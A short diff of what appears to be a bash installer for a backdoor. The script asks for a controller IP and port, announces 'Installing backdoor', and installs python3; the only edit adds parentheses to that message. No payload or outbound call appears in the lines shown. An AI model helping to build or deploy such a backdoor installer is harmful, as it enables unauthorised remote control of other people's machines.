@@ -2,7 +2,7 @@
 # get options from user
 read -p "Enter controller IP: " server_ip
 read -p "Enter controller port: " server_port
-echo "Installing backdoor... this may take a minute"
+echo "Installing backdoor... (this may take a minute)"
 
 # install dependencies
 yum install -y -q python3
